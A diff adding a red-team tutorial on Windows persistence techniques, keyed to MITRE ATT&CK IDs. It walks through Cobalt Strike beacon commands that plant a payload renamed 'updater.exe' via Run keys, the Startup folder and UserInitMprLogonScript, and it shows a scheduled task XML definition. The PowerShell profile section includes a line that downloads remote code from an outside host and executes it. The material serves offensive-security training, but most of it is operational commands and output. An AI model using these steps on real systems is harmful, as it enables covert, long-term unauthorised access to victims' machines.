@@ -1,0 +1,174 @@
+Persistence is important, particularly for long-term access, because an adversary may not be able to reliably regain a foothold via their initial access technique.
+Persistence is a tactic [TA0003] used to maintain access to a compromised system across reboots and other interruptions. 
+
+techniques:
+1) Registry Run Keys & Startup Folder [T1547.001].
+2) Logon Scripts [T1037.001].
+3) PowerShell Profile [T1546.013].
+4) Scheduled Tasks [T1053.005].
+5) Component Object Model Hijacking [T1546.015].
+
+
+1) Boot & Logon Autostart Execution
+Boot or Logon Autostart Execution is a collection of techniques [T1547] where an adversary configures the computer to automatically execute a payload during startup, or when a user logs in.
+  
+Registry Run Keys
+The Windows Registry contains multiple keys that allow programs to run when a user logs in.  These are used legitimately to start some default Windows applications, or 3rd party applications that the user has installed.  The two common user keys are:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+///
+beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
+beacon> upload C:\Payloads\http_x64.exe
+beacon> mv http_x64.exe updater.exe
+
+beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
+Setting registry key \\.\0000000080000001\Software\Microsoft\Windows\CurrentVersion\Run\Updater with type 1
+Successfully set regkey
+SUCCESS.
+///
+
+Read it back with reg_query to make sure it was added correctly.
+///
+beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
+
+  01/07/2025 11:51:52 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+    Updater                REG_EXPAND_SZ          %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe
+///
+Use reg_delete to remove a registry key or value when it's no longer required.
+
+
+Startup Folder
+
+Programs in the user's startup folder will also run automatically on login.  The location of this folder is %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup.  Simply upload an executable into this directory and it will run each time the user logs in.
+
+///
+beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+beacon> upload C:\Payloads\http_x64.exe
+beacon> mv http_x64.exe updater.exe
+///
+Delete the file when the persistence is no longer required.
+
+2) Logon Script
+
+The HKCU\Environment registry key contains the user's environment variables, such as %Path% and %TEMP%.  An adversary can add another value to this key called UserInitMprLogonScript [T1037.001].  As with the autorun keys, this value should contain the path to a program, then it will execute automatically when the user logs in.
+
+///
+beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
+
+Setting registry key \\.\0000000080000001\Environment\UserInitMprLogonScript with type 2
+Successfully set regkey
+SUCCESS.
+///
+
+3) PowerShell Profile
+A PowerShell profile, profile.ps1, is a script that executes when new PowerShell windows are opened by a user.  Developers often use these to customise the appearance and behaviour of their PowerShell sessions.  An adversary can create or modify the profile of a user to execute malicious code [T1546.013].
+
+Microsoft publishes details on where these profiles can be created for both PowerShell and PowerShell Core. 
+For example, $HOME\Documents\WindowsPowerShell\Profile.ps1.
+
+If the profile and/or directory doesn't exist, just create it.
+
+///
+ls C:\Users\pchilds\Documents
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     12/22/2024 16:47:10   My Music
+          dir     12/22/2024 16:47:10   My Pictures
+          dir     12/22/2024 16:47:10   My Videos
+ 402b     fil     12/22/2024 16:47:22   desktop.ini
+ 
+beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
+beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
+///
+
+It's important not to put any code into the profile that will block because the user will not be presented with an input prompt until the profile script has finished executing.  Some workarounds include executing the payload via the Start-Job cmdlet.
+
+For example:
+///
+$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
+///
+Then upload the profile to the user's WindowsPowerShell directory.
+///
+beacon> upload C:\Payloads\Profile.ps1
+///
+
+4) Scheduled Task
+
+The Windows Task Scheduler is able to perform routine tasks based on pre-defined triggers, including:
+At a specific time on a daily, weekly, or monthly schedule.
+When the computer goes idle.
+When the system starts.
+When a user logs on.
+When a system event occurs.
+These are usually used to run software updates, and other clean-up tasks, etc.  An adversary can also add a scheduled task to execute payloads on a trigger of their choosing [T1053.005].
+At their heart, tasks are defined in XML format.  Information about creating task definitions can be found here and here.  The schtaskscreate BOF can create scheduled tasks from a given XML task definition.  Here's an example that will trigger when the user logs in:
+
+<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+      <UserId>CONTOSO\pchilds</UserId>
+    </LogonTrigger>
+  </Triggers>
+  <Principals>
+    <Principal>
+      <UserId>CONTOSO\pchilds</UserId>
+    </Principal>
+  </Principals>
+  <Settings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+  </Settings>
+  <Actions>
+    <Exec>
+      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
+    </Exec>
+  </Actions>
+</Task>
+
+Run the command schtaskscreate \Beacon XML CREATE without any further arguments and a file dialogue box will appear for you to browse and select the XML file.
+
+Replace \Beacon with any name you like, but it must start with the \.
+
+\\\
+beacon> schtaskscreate \Beacon XML CREATE
+
+createTask hostname: taskpath:\Beacon mode:2 force:0
+Got user name and security descriptor
+Valitdated task
+Created task path
+Registered task
+SUCCESS.
+\\\
+The task can be deleted using schtasksdelete.
+
+5) COM Hijacking
+The Component Object Model (COM) can be a bit tricky to wrap your head around at first.  The following explanation is an over-simplification, but it should be enough for you to understand the premise.  COM provides an interoperability standard so that applications written in different languages can reuse the same software libraries.
+
+COM exposes its features through interfaces, which if you're not familiar with, is like a software contract.  Take the following C# as an example:
+interface IMyInterface
+\\\
+{
+    string MyMethod(string myInput);
+}
+\\\
+Finding COM hijacks
+Process Monitor (aka procmon) from Sysinternals is an excellent tool for finding COM hijacking opportunities, as it displays real-time access to the registry.  It can be used to find instances where a process is attempting to load a COM object that it couldn't find.
+
+An adversary will typically do this analysis on their own machine (i.e. in a VM that they've setup to replicate the environment of their target).  They will also test the hijack in this VM to ensure it's stable before using it on the target system.
+
+Add some filters in procmon where:
+
+The Operation is RegOpenKey.
+The Path contains InprocServer32 or LocalServer32.
+The Result is NAME NOT FOUND.
+
+
+As indicated by the image above, you will see thousands of these.  The results can be analysed directly in procmon, or exported in a format such as CSV.  Exporting the results is useful for frequency analysis (i.e. when looking for a COM object that's loaded a modest number of times).
+
+A COM object I've used in the past is one loaded by DllHost.exe:  HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32.
+
+We can see that this key does exist in HKLM, but not in HKCU.
+https://www.hackingarticles.in/windows-persistence-com-hijacking-mitre-t1546-015/
